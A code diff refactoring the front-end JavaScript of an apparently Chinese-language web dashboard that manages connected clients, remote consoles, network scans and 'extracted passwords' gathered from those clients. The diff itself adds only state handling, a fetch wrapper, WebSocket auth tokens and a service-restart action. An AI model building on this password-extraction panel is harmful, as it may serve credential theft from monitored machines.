@@ -1,17 +1,94 @@
 // 全局变量
 let ws = null;
-let clients = [];
-let currentClientId = null;
+const state = {
+    clients: [],
+    currentClientId: null,
+    reconnectTimer: null,
+    reconnectDelay: 1000,
+    autoRefreshTimer: null,
+    toastTimer: null,
+    isUnloading: false,
+    isReconnecting: false,
+    reconnectAttempts: 0,
+    connectingClients: new Set(),
+    currentExtractedPasswords: [],
+    lastExtractedPasswords: null,
+    currentClientTagFilter: '',
+    wsMessageToken: null,
+    wsMessageTokenExpires: 0
+};
+Object.defineProperties(window, {
+    clients: {
+        get() { return state.clients; },
+        set(value) { state.clients = value; }
+    },
+    currentClientId: {
+        get() { return state.currentClientId; },
+        set(value) { state.currentClientId = value; }
+    },
+    currentExtractedPasswords: {
+        get() { return state.currentExtractedPasswords; },
+        set(value) { state.currentExtractedPasswords = value; }
+    },
+    lastExtractedPasswords: {
+        get() { return state.lastExtractedPasswords; },
+        set(value) { state.lastExtractedPasswords = value; }
+    },
+    connectingClients: {
+        get() { return state.connectingClients; },
+        set(value) { state.connectingClients = value; }
+    },
+    currentClientTagFilter: {
+        get() { return state.currentClientTagFilter; },
+        set(value) { state.currentClientTagFilter = value; }
+    },
+    wsMessageToken: {
+        get() { return state.wsMessageToken; },
+        set(value) { state.wsMessageToken = value; }
+    },
+    wsMessageTokenExpires: {
+        get() { return state.wsMessageTokenExpires; },
+        set(value) { state.wsMessageTokenExpires = value; }
+    }
+});
+window.appState = state;
+
+const rawFetch = window.fetch.bind(window);
+async function apiFetch(input, init = {}) {
+    const headers = new Headers(init.headers || {});
+    if (!headers.has('Accept')) headers.set('Accept', 'application/json');
+    if (init.body && !headers.has('Content-Type')) {
+        headers.set('Content-Type', 'application/json');
+    }
+    const response = await rawFetch(input, { credentials: 'same-origin', ...init, headers });
+    const contentType = response.headers.get('content-type') || '';
+    if (!response.ok) {
+        let message = response.statusText || `HTTP ${response.status}`;
+        if (contentType.includes('application/json')) {
+            try {
+                const body = await response.clone().json();
+                message = body.error || body.message || JSON.stringify(body);
+            } catch (e) {}
+        } else {
+            try {
+                const text = await response.clone().text();
+                if (text) message = text;
+            } catch (e) {}
+        }
+        throw new Error(message);
+    }
+    return response;
+}
+window.fetch = apiFetch;
+window.apiFetch = apiFetch;
+
 let reconnectTimer = null;
-let reconnectDelay = 1000;
 let autoRefreshTimer = null;
 let toastTimer = null;
 let isUnloading = false;
 let isReconnecting = false;
 let reconnectAttempts = 0;
-let connectingClients = new Set();
-let currentExtractedPasswords = [];
-let lastExtractedPasswords = null;
+
 // 提取结果分页相关
 let extractedPage = 1;                // 当前页码
 const EXTRACT_PAGE_SIZE = 50;         // 每页条数
@@ -25,7 +102,6 @@ let currentLogHighlightRaw = '';        // 原始密码高亮（可选）
 let currentLogScrollTarget = '';        // 需要滚动到的目标文本
 let currentLogClientId = '';
 let currentLogFilename = '';
-let currentClientTagFilter = '';
 let currentConsoleClientId = null;
 let currentConsoleSubscribedClientId = null;
 let consoleMessages = [];
@@ -261,6 +337,21 @@ function connectWebSocket() {
     }
 
     ws = new WebSocket(WS_URL);
+    const originalWsSend = ws.send.bind(ws);
+    ws.send = (data) => {
+        try {
+            if (typeof data === 'string') {
+                const payload = JSON.parse(data);
+                if (payload && typeof payload === 'object' && !payload.authToken) {
+                    payload.authToken = state.wsMessageToken;
+                    data = JSON.stringify(payload);
+                }
+            }
+        } catch (e) {
+            // Keep raw data if parsing fails
+        }
+        return originalWsSend(data);
+    };
 
     ws.onopen = () => {
         dom.wsStatus.classList.add('connected');
@@ -345,6 +436,9 @@ function connectWebSocket() {
 
 // 处理 WebSocket 消息
 function handleWebSocketMessage(data) {
+    if (data && data.authToken) {
+        state.wsMessageToken = data.authToken;
+    }
     switch (data.type) {
         case 'clients_list':
             clients = data.clients;
@@ -1127,7 +1221,6 @@ function scanNetwork() {
 async function loadNetworkList() {
     if (!dom.networkTable) return;
     dom.networkTable.innerHTML = '<tr><td colspan="4" class="empty-state">加载中...</td></tr>';
-    showToast('正在刷新网络配置...', 'info');
     try {
         const response = await fetch('/api/network/list');
         const list = await response.json();
@@ -1278,7 +1371,6 @@ function renderNetworkTable(items) {
 async function loadNetworkRequests() {
     if (!dom.networkRequestsTable) return;
     dom.networkRequestsTable.innerHTML = '<tr><td colspan="5" class="empty-state">加载中...</td></tr>';
-    showToast('正在刷新IP申请列表...', 'info');
     try {
         const response = await fetch('/api/network/requests');
         const requests = await response.json();
@@ -1367,7 +1459,6 @@ async function deleteNetworkRequest(id) {
 // 刷新日志列表（日志页面）
 async function refreshLogs() {
     const clientId = dom.logClientSelect.value;
-    showToast('正在刷新日志...', 'info');
     try {
         let logs, fetchClientId;
         // 请求带上 refresh=true，强制后端绕过 Alist 缓存
@@ -1688,8 +1779,22 @@ function saveSettings() {
     showToast(`设置已保存 (心跳: ${interval}ms, 超时: ${timeout}ms)`, 'success');
 }
 
+function confirmRestartService() {
+    showConfirmModal('重启服务', '确认要重启 PM2 托管的服务吗？', restartService);
+}
+
+async function restartService() {
+    try {
+        const response = await apiFetch('/api/system/restart', { method: 'POST' });
+        const data = await response.json();
+        showToast(data.message || '已发送重启请求', 'success');
+    } catch (error) {
+        console.error('重启服务失败:', error);
+        showToast('重启失败: ' + error.message, 'error');
+    }
+}
+
 async function loadBlacklist(page = 1) {
-    showToast('正在刷新黑名单...', 'info');
     try {
         blacklistPage = page;
         const response = await fetch(`/api/blacklist?page=${blacklistPage}&limit=${blacklistPageSize}`);
@@ -1840,6 +1945,7 @@ async function viewLatestPasswords() {
     if (lastExtractedPasswords && lastExtractedPasswords.length > 0) {
         displayExtractedPasswords(lastExtractedPasswords);
         document.getElementById('extractModal').classList.add('show');
+        showToast('已显示最新提取结果', 'success');
         return;
     }
     try {
@@ -1858,6 +1964,7 @@ async function viewLatestPasswords() {
         } catch (e) { console.warn('过滤黑名单失败'); }
         displayExtractedPasswords(passwords);
         document.getElementById('extractModal').classList.add('show');
+        showToast('已加载提取结果', 'success');
     } catch (e) {
         console.error('查看密码提取结果失败:', e);
         showToast('查看失败，可能还没有提取过密码', 'error');
